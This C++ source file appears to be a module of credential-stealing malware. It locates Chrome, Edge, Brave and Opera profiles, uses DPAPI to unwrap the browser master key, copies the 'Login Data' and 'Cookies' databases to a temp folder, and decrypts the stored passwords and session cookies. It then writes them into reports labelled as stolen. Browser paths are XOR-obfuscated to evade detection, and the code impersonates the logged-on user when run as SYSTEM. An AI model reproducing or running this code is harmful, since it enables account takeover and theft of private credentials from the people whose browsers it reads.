#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>
#include <wincrypt.h>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "crypt32.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
            try {
                std::ifstream f(localStatePath);
                if (!f.is_open()) return {};
                nlohmann::json j;
                f >> j;

                if (!j.contains("os_crypt") || !j["os_crypt"].contains("encrypted_key")) return {};

                std::string encryptedKeyB64 = j["os_crypt"]["encrypted_key"];
                std::vector<BYTE> encryptedKey = crypto::Base64Decode(encryptedKeyB64);
                if (encryptedKey.size() < 5) return {};

                std::vector<BYTE> dpapiEncryptedKey(encryptedKey.begin() + 5, encryptedKey.end());
                DATA_BLOB in, out;
                in.pbData = dpapiEncryptedKey.data();
                in.cbData = (DWORD)dpapiEncryptedKey.size();

                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
                    LocalFree(out.pbData);
                    return masterKey;
                }
            } catch (...) {}
            return {};
        }

        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey) {
            try {
                if (ciphertext.size() < 15) return "";
                if (memcmp(ciphertext.data(), "v10", 3) == 0 || memcmp(ciphertext.data(), "v11", 3) == 0) {
                    if (ciphertext.size() < 3 + 12 + 16) return "";
                    std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
                    std::vector<BYTE> payloadToDecrypt(ciphertext.begin() + 15, ciphertext.end());
                    crypto::AesGcm aes(masterKey);
                    std::vector<BYTE> decrypted = aes.decrypt(payloadToDecrypt, iv);
                    return std::string(decrypted.begin(), decrypted.end());
                } else if (memcmp(ciphertext.data(), "v20", 3) == 0) {
                    return "[v20 ABE]";
                } else {
                    DATA_BLOB in, out;
                    in.pbData = (BYTE*)ciphertext.data();
                    in.cbData = (DWORD)ciphertext.size();
                    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                        std::string res((char*)out.pbData, out.cbData);
                        LocalFree(out.pbData);
                        return res;
                    }
                }
            } catch (...) {}
            return "";
        }

        struct BrowserPath {
            std::string name;
            std::string userDataPath;
        };

        std::vector<BrowserPath> GetChromiumBrowsers() {
            char path[MAX_PATH];
            std::vector<BrowserPath> browsers;
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
                std::string localAppData(path);
                // "Google\\Chrome\\User Data"
                browsers.push_back({"Chrome", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x1d\x35\x35\x3d\x36\x3f\x00\x19\x32\x28\x35\x37\x3f\x00\x0f\x29\x3f\x28\x00\x1e\x3b\x2e\x3b", 23))});
                // "Microsoft\\Edge\\User Data"
                browsers.push_back({"Edge", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x00\x1f\x3e\x3d\x3f\x00\x0f\x29\x3f\x28\x00\x1e\x3b\x2e\x3b", 24))});
                // "BraveSoftware\\Brave-Browser\\User Data"
                browsers.push_back({"Brave", localAppData + "\\" + utils::ws2s(utils::xor_wstr(L"\x18\x28\x3b\x2c\x3f\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x18\x28\x3b\x2c\x3f\x75\x18\x28\x35\x2d\x29\x3f\x28\x00\x0f\x29\x3f\x28\x00\x1e\x3b\x2e\x3b", 39))});
            }
            char appDataPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
                std::string appData(appDataPath);
                // "Opera Software\\Opera Stable"
                browsers.push_back({"Opera", appData + "\\" + utils::ws2s(utils::xor_wstr(L"\x15\x2a\x3f\x28\x3b\x00\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x15\x2a\x3f\x28\x3b\x00\x09\x2e\x3b\x38\x36\x3f", 27))});
            }
            return browsers;
        }

        std::string CopyDatabase(const std::string& dbPath) {
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string destDb = std::string(tempPath) + "chrome_db_" + std::to_string(GetTickCount());
            if (CopyFileA(dbPath.c_str(), destDb.c_str(), FALSE)) {
                CopyFileA((dbPath + "-wal").c_str(), (destDb + "-wal").c_str(), FALSE);
                CopyFileA((dbPath + "-shm").c_str(), (destDb + "-shm").c_str(), FALSE);
                return destDb;
            }
            return "";
        }

        void CleanupDatabase(const std::string& tempDb) {
            DeleteFileA(tempDb.c_str());
            DeleteFileA((tempDb + "-wal").c_str());
            DeleteFileA((tempDb + "-shm").c_str());
        }
    }

    std::string DumpChromiumPasswords() {
        bool impersonated = false;
        if (utils::Shared::IsSystem()) impersonated = utils::Shared::ImpersonateLoggedOnUser();

        std::stringstream report;
        report << "CHROMIUM_PASSWORDS_DUMPED:\n";
        auto browsers = GetChromiumBrowsers();
        bool foundAny = false;

        for (const auto& browser : browsers) {
            if (!fs::exists(browser.userDataPath)) continue;
            std::string localState = browser.userDataPath + "\\Local State";
            std::vector<BYTE> key = GetMasterKey(localState);
            if (key.empty()) continue;

            try {
                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
                    if (it.depth() > 3) { it.disable_recursion_pending(); continue; }
                    const auto& entry = *it;
                    // "Login Data"
                    if (entry.path().filename() == utils::ws2s(utils::xor_wstr(L"\x16\x35\x3d\x33\x34\x00\x1e\x3b\x2e\x3b", 10))) {
                        std::string tempDb = CopyDatabase(entry.path().string());
                        if (tempDb.empty()) continue;
                        sqlite3* db;
                        if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                            // "SELECT origin_url, username_value, password_value FROM logins"
                            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
                            sqlite3_stmt* stmt;
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                                    const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
                                    const void* blob = sqlite3_column_blob(stmt, 2);
                                    int blobLen = sqlite3_column_bytes(stmt, 2);
                                    if (blobLen > 0) {
                                        std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
                                        std::string password = DecryptPassword(encryptedPass, key);
                                        if (!password.empty()) {
                                            report << browser.name << " | " << (url_ptr?url_ptr:"") << " | " << (user_ptr?user_ptr:"") << " | " << password << "\n";
                                            foundAny = true;
                                        }
                                    }
                                }
                                sqlite3_finalize(stmt);
                            }
                            sqlite3_close(db);
                        }
                        CleanupDatabase(tempDb);
                    }
                }
            } catch (...) {}
        }
        if (impersonated) utils::Shared::RevertToSelf();
        return foundAny ? report.str() : "No Chromium credentials found.";
    }

    std::string StealChromiumCookies() {
        bool impersonated = false;
        if (utils::Shared::IsSystem()) impersonated = utils::Shared::ImpersonateLoggedOnUser();

        std::stringstream ss;
        ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
        auto browsers = GetChromiumBrowsers();
        int totalCookies = 0;

        for (const auto& browser : browsers) {
            if (!fs::exists(browser.userDataPath)) continue;
            std::string localState = browser.userDataPath + "\\Local State";
            std::vector<BYTE> key = GetMasterKey(localState);
            if (key.empty()) continue;

            try {
                for (auto it = fs::recursive_directory_iterator(browser.userDataPath); it != fs::recursive_directory_iterator(); ++it) {
                    if (it.depth() > 3) { it.disable_recursion_pending(); continue; }
                    const auto& entry = *it;
                    // "Cookies"
                    if (entry.path().filename() == utils::ws2s(utils::xor_wstr(L"\x19\x35\x35\x31\x33\x3f\x29", 7))) {
                        std::string tempDb = CopyDatabase(entry.path().string());
                        if (tempDb.empty()) continue;
                        sqlite3* db;
                        if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                            const char* query = "SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies";
                            sqlite3_stmt* stmt;
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                    const char* path = (const char*)sqlite3_column_text(stmt, 1);
                                    int isSecure = sqlite3_column_int(stmt, 2);
                                    sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                                    const char* name = (const char*)sqlite3_column_text(stmt, 4);
                                    const void* blob = sqlite3_column_blob(stmt, 5);
                                    int blobLen = sqlite3_column_bytes(stmt, 5);
                                    if (blobLen > 0) {
                                        std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
                                        std::string value = DecryptPassword(encryptedVal, key);
                                        if (!value.empty()) {
                                            ss << (host?host:"") << "\tTRUE\t" << (path?path:"") << "\t" << (isSecure?"TRUE":"FALSE") << "\t" << expiry << "\t" << (name?name:"") << "\t" << value << "\n";
                                            totalCookies++;
                                        }
                                    }
                                }
                                sqlite3_finalize(stmt);
                            }
                            sqlite3_close(db);
                        }
                        CleanupDatabase(tempDb);
                    }
                }
            } catch (...) {}
        }
        if (impersonated) utils::Shared::RevertToSelf();
        if (totalCookies == 0) return "No Chromium cookies found.";
        return ss.str();
    }
}
